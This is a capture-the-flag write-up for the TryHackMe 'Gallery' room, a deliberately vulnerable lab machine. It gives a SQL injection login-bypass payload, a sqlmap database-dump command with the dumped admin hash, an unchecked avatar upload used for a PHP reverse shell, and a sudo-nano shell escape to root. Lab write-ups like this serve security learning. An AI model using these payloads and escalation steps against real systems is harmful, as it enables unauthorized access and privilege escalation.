# Gallery
[TryHackMe room link](https://tryhackme.com/room/gallery666)

# Informations about the room
> Try to exploit our image gallery system

# Open ports

80

8080

# Enumeration

Inside the webserver hosted on port 8080 there is a login page vulnerable to SQLi

You can use `' or 1=1 -- -` to log in as admin or if you want to dump the MySQL database save the request made with the browser in a file and pass it to sqlmap

`sqlmap -r request.rq -dbms --dump`

A `gallery.db` database is found:

```sql
Database: gallery_db
Table: users
[1 entry]
+----+------+------------------------------------------+----------+----------------------------------+----------+--------------+---------------------+------------+---------------------+
| id | type | avatar                                   | lastname | password                         | username | firstname    | date_added          | last_login | date_updated        |
+----+------+------------------------------------------+----------+----------------------------------+----------+--------------+---------------------+------------+---------------------+
| 1  | 1    | uploads/1629883080_1624240500_avatar.png | Admin    | a228b12a08b6527e7978cbe5d914531c | admin    | Adminstrator | 2021-01-20 14:02:37 | NULL       | 2021-08-25 09:18:12 |
+----+------+------------------------------------------+----------+----------------------------------+----------+--------------+---------------------+------------+---------------------+
```

This is only needed for the flag because i did not manage to crack the password hash

But we can still log in as admin using the injection above so it's not a problem

After logging in the site we have the possibility to upload a profile avatar

The site does not check the file extension so we can freely upload a php reverse shell to the machine

# Privilege escalation

We are user `www-data` 

After enumerating we can see a history file with the password for the user `mike`:
```console
╔══════════╣ Searching passwords in history files                                                                                                                                            
      @stats   = stats                                                                                                                                                                       
      @items   = { _seq_: 1  }                                                                                                                                                               
      @threads = { _seq_: "A" }                                                                                                                                                              
sudo -lREDACTED                                                                                                                                                                     
sudo -l
```

After logging in the mike user, using `sudo -l` we discover that there is a `rootkit.sh` script in the `/opt` directory that can be executed as root:

```bash
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```

The script is using `nano` to display the `report.txt` file

So if we run the script with sudo the nano binary does not drop the elevated privileges and we can abuse it to spawn a root shell:

[GTFOBins link](https://gtfobins.github.io/gtfobins/nano/)

```console
nano
^R^X
reset; sh 1>&0 2>&0
```


